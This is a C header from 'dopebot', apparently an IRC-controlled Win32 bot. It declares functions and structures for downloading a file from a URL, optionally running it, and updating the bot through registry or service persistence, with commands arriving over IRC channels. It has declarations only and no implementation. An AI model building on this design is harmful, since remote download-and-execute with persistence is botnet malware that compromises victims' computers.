/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_DOWNLOAD
DWORD WINAPI download_file(LPVOID param);
DWORD WINAPI update_file(LPVOID param);
HRESULT xURLDownloadToFile(char *szURL, char *szFileName);

typedef struct download 
{
	char szUrl[256];
	char szDestination[MAX_PATH];
	bool bRun;
	SOCKET bsock;
	char szAction[32];
	char szChannel[32];
} download;

typedef struct update
{
	char szUrl[256];
	char szFileName[32];
	char szRegKeyName[32];
	char szServiceName[32];
	bool bUseRegistry;
	bool bUseService;
	SOCKET bsock;
	WSAEVENT event;
	char szAction[32];
	char szChannel[32];
} update;
#endif